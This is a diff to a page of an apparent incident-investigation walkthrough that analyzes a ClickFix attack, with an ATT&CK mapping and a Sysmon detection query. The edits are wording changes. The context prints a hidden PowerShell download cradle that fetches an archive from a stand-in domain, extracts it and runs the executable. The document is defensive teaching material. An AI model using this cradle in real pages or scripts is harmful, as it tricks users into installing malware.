@@ -24,7 +24,7 @@ powershell -w h -c "$t=$env:temp;iwr 'https://update-cache-m9tdco18phmc.com/a/..
   tar xf $t\q -C $t;saps $t\QuickConnect\QuickConnectSupport.exe"
 ```
 
-That's a hidden download command pasted into the Run box. It's what a fake "verify you are human" or "fix this error" page does: it copies a command to the clipboard and tells the user to press ++win+r++, ++ctrl+v++, ++enter++. The `\1` at the end of each value is an MRU marker and isn't part of the command.
+That's a PowerShell download cradle, a one-liner that fetches a payload and runs it, pasted into the Run dialog. It's what a fake "verify you are human" or "fix this error" page does: it copies a command to the clipboard and tells the user to press ++win+r++, ++ctrl+v++, ++enter++. The `\1` at the end of each value is an MRU marker and isn't part of the command.
 
 !!! finding "Finding · Q003"
     The technique is **ClickFix** (ATT&CK [T1204.004](https://attack.mitre.org/techniques/T1204/004/), Malicious Copy and Paste).
@@ -41,8 +41,8 @@ Here's the command piece by piece:
 |---|---|
 | `powershell -w h` | Runs PowerShell with a hidden window |
 | `iwr '...' -o $t\q` | `Invoke-WebRequest`: downloads `.../pkg` and saves it as `%TEMP%\q` |
-| `tar xf $t\q -C $t` | Unpacks it with the built-in `tar.exe` |
-| `saps $t\QuickConnect\QuickConnectSupport.exe` | `Start-Process`: runs what was unpacked |
+| `tar xf $t\q -C $t` | Extracts it with the built-in `tar.exe` |
+| `saps $t\QuickConnect\QuickConnectSupport.exe` | `Start-Process`: runs what was extracted |
 
 Sysmon logged PowerShell looking up the download domain:
 
@@ -54,9 +54,9 @@ bifract_category="dns_query" query=~update-cache | groupBy(computer_name, image,
 The lookup is logged at 14:02:26.545, about a second before the process start event for the same PowerShell. Sysmon timestamps for different event types can be off by that much, so don't read too much into ordering under a second or two.
 
 !!! finding "Finding · Q004"
-    Explorer launched **powershell.exe**, which downloaded and unpacked the first bundle from `update-cache-m9tdco18phmc.com`.
+    Explorer launched **powershell.exe**, which downloaded the payload archive from `update-cache-m9tdco18phmc.com` and extracted it.
 
 !!! warning "Don't visit"
     `update-cache-m9tdco18phmc.com` is a made-up domain. Don't resolve or browse to it.
 
-Next: [what came out of that bundle](03-loader.md).
+Next: [what was in that archive](03-loader.md).
